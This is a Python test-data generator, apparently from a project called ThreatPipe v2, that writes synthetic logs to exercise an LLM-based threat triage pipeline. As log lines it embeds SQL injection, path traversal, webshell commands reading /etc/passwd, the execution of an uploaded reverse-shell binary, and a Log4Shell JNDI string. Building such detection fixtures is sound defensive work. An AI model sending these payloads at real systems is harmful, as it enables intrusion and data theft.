"""
ThreatPipe v2 — Realistic Test Log Generator
==============================================
Generates multi-format attack logs for testing the LLM triage and 
LangGraph agent pipeline. 

Run:
    python generate_test_logs.py                      # Default 200 lines
    python generate_test_logs.py --size large         # 2000 lines (tests sliding window)
    python generate_test_logs.py --attacks sqli,webshell  # Only specific attacks
"""

import random
import argparse
from datetime import datetime, timedelta
from pathlib import Path

# ── Config ────────────────────────────────────────────────────────────────────
ATTACKER_IPS  = ["192.168.1.55", "10.0.0.42", "203.0.113.77", "198.51.100.23"]
RECON_IP      = "192.168.1.80"
BENIGN_IPS    = [f"10.1.{r}.{c}" for r in range(1, 6) for c in range(10, 30)]
BASE_TS       = datetime(2026, 4, 16, 2, 0, 0)

SIZE_MAP = {
    "small":  {"benign": 30,  "attack_scale": 1},
    "medium": {"benign": 150, "attack_scale": 2},
    "large":  {"benign": 1500,"attack_scale": 5},
}

def ts(offset_sec):
    return (BASE_TS + timedelta(seconds=offset_sec)).strftime("%d/%b/%Y:%H:%M:%S")

def generate_benign(lines, t, count):
    benign_pages = [
        "/index.html", "/about.html", "/style.css", "/main.js",
        "/api/health", "/favicon.ico", "/images/logo.png", "/cart",
    ]
    for _ in range(count):
        ip = random.choice(BENIGN_IPS)
        page = random.choice(benign_pages)
        sz = random.randint(500, 50000)
        lines.append(f'{ip} - - [{ts(t)}] "GET {page} HTTP/1.1" 200 {sz}')
        t += random.randint(1, 10)
    return t

def generate_recon(lines, t, scale):
    recon_paths = ["/.env", "/.git/config", "/wp-config.php", "/phpinfo.php", "/backup.zip", "/adminer.php"]
    for path in recon_paths * scale:
        status = 200 if path in ["/.env", "/.git/config"] else random.choice([403, 404])
        lines.append(f'{RECON_IP} - - [{ts(t)}] "GET {path} HTTP/1.1" {status} {random.randint(100, 500)}')
        t += random.randint(2, 5)
    return t

def generate_webshell(lines, t, scale):
    ip = ATTACKER_IPS[0]
    # Upload
    lines.append(f'{ip} - - [{ts(t)}] "POST /uploads/upload.php HTTP/1.1" 200 432')
    t += 3
    # Execute
    cmds = ["whoami", "id", "cat+/etc/passwd", "uname+-a", "ps+aux"] * scale
    for cmd in cmds:
        lines.append(f'{ip} - - [{ts(t)}] "GET /uploads/shell.php?cmd={cmd} HTTP/1.1" 200 {random.randint(50,2000)}')
        t += random.randint(2, 8)
    # Obfuscated
    for _ in range(scale):
        lines.append(f'{ip} - - [{ts(t)}] "GET /uploads/cache.php HTTP/1.1" 200 567')
        t += 5
    return t

def generate_sqli(lines, t, scale):
    ip = ATTACKER_IPS[2]
    payloads = [
        "/search?q=1'+OR+'1'='1",
        "/product?id=1+UNION+SELECT+1,2,3--",
        "/api/user?id=1;DROP+TABLE+users--",
        "/search?q=1+AND+SLEEP(5)--",
    ] * scale
    for payload in payloads:
        lines.append(f'{ip} - - [{ts(t)}] "GET {payload} HTTP/1.1" 500 1234')
        t += random.randint(3, 10)
    return t

def generate_lfi(lines, t, scale):
    ip = ATTACKER_IPS[3]
    payloads = [
        "/page?file=../../../../etc/passwd",
        "/view?page=php://filter/convert.base64-encode/resource=config.php",
    ] * scale
    for payload in payloads:
        lines.append(f'{ip} - - [{ts(t)}] "GET {payload} HTTP/1.1" 200 4567')
        t += random.randint(2, 8)
    return t

def generate_ssh_brute(lines, t, scale):
    ip = ATTACKER_IPS[1]
    for user in ["root", "admin", "ubuntu"] * (3 * scale):
        lines.append(f'May 17 03:14:20 server sshd[2345]: Failed password for {user} from {ip} port {random.randint(40000,65000)} ssh2')
        t += 1
    lines.append(f'May 17 03:14:30 server sshd[2345]: Accepted password for deploy from {ip} port 54321 ssh2')
    t += 5
    return t

def generate_forensic_logs(lines, t):
    lines.extend([
        f'[MEMORY] PID=1337 process=svchost.exe malfind=YES injected_region=0x7ff00000 dump=/tmp/threatpipe_evidence/www/forensics/pid_1337_svchost.dmp',
        f'[REGISTRY] HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run malware REG_SZ C:\\Users\\Public\\update.bin',
        f'2026-04-16T03:14:25Z m... /var/www/html/uploads/shell.php',
        f'2026-04-16T03:14:26Z m... /var/www/html/images/evil.png',
    ])
    return t + 10

def generate_ftp(lines, t):
    ip = ATTACKER_IPS[0]
    lines.extend([
        f'May 17 08:59:01 server proftpd[5678]: {ip} - STOR /uploads/shell.php',
        f'May 17 08:59:05 server proftpd[5678]: {ip} - RETR /backup/db_dump.sql',
    ])
    return t + 5




def generate_complex_attacks(lines, t, scale):
    ip = ATTACKER_IPS[0] # 192.168.1.55
    
    # 1. JSP Web Shell Execution
    for _ in range(scale):
        lines.append(f'{ip} - - [{ts(t)}] "GET /uploads/cmd.jsp?cmd=cat+/etc/passwd HTTP/1.1" 200 897')
        t += random.randint(3, 8)

    # 2. Python Reverse Shell Upload & Trigger
    lines.append(f'{ip} - - [{ts(t)}] "POST /uploads/upload.php HTTP/1.1" 200 432')
    t += 2
    lines.append(f'{ip} - - [{ts(t)}] "GET /uploads/rev.py HTTP/1.1" 200 345')
    t += 2

    # 3. Compiled ELF Binary Upload (Byte-code execution)
    lines.append(f'May 17 09:15:00 server proftpd[5678]: {ip} - STOR /uploads/rev_shell.elf')
    t += 3
    # Web shell used to make it executable and run it
    lines.append(f'{ip} - - [{ts(t)}] "GET /uploads/shell.php?cmd=chmod+777+/uploads/rev_shell.elf HTTP/1.1" 200 15')
    t += 2
    lines.append(f'{ip} - - [{ts(t)}] "GET /uploads/shell.php?cmd=/uploads/rev_shell.elf HTTP/1.1" 200 0')
    t += 2

    # 4. Polyglot Image LFI Execution (Forcing PHP to parse the PNG)
    for _ in range(scale):
        lines.append(f'{ip} - - [{ts(t)}] "GET /index.php?file=images/evil.png&cmd=id HTTP/1.1" 200 45')
        t += random.randint(3, 8)

    # 5. Log4Shell / JNDI Injection (in User-Agent or URL)
    for _ in range(scale):
        lines.append(f'{ip} - - [{ts(t)}] "GET /api/search HTTP/1.1" 200 1234 "-" "${{\'jndi:ldap://10.0.0.42:1389/a\'}}"')
        t += random.randint(5, 10)

    return t

# ── UPDATE THIS DICTIONARY ──────────────────────────────────────────────
ATTACK_GENERATORS = {
    "recon": generate_recon,
    "webshell": generate_webshell,
    "sqli": generate_sqli,
    "lfi": generate_lfi,
    "ssh": generate_ssh_brute,
    "complex": generate_complex_attacks,  # <-- ADD THIS LINE
}



def main():
    parser = argparse.ArgumentParser(description="ThreatPipe v2 — Log Generator")
    parser.add_argument("--size", choices=["small", "medium", "large"], default="medium", help="Volume of logs")
    parser.add_argument("--attacks", default="all", help="Comma-separated attacks (recon,webshell,sqli,lfi,ssh) or 'all'")
    parser.add_argument("--output", default="realistic_attack.log", help="Output filename")
    args = parser.parse_args()

    config = SIZE_MAP[args.size]
    
    if args.attacks == "all":
        active_attacks = list(ATTACK_GENERATORS.keys())
    else:
        active_attacks = [a.strip() for a in args.attacks.split(",")]

    lines = []
    t = 0

    print(f"📝 Generating {args.size} dataset ({config['benign']} benign lines)...")
    
    # 1. Benign baseline
    t = generate_benign(lines, t, config["benign"])
    
    # 2. Attacks
    for attack_name in active_attacks:
        if attack_name in ATTACK_GENERATORS:
            print(f"   → Adding {attack_name} attacks...")
            t = ATTACK_GENERATORS[attack_name](lines, t, config["attack_scale"])
    
    # 3. Forensic formats (always included)
    t = generate_forensic_logs(lines, t)
    t = generate_ftp(lines, t)
    
    # 4. More benign noise at bottom
    t = generate_benign(lines, t, config["benign"] // 2)

    # Write
    output_path = Path(args.output)
    output_path.write_text("\n".join(lines) + "\n")
    
    attack_count = len(lines) - config["benign"] - (config["benign"] // 2)
    print(f"\n✅ Generated: {output_path.resolve()}")
    print(f"   Total lines : {len(lines)}")
    print(f"   Attack lines: ~{attack_count}")
    print(f"   Benign lines: ~{config['benign'] + config['benign'] // 2}")

if __name__ == "__main__":
    main()
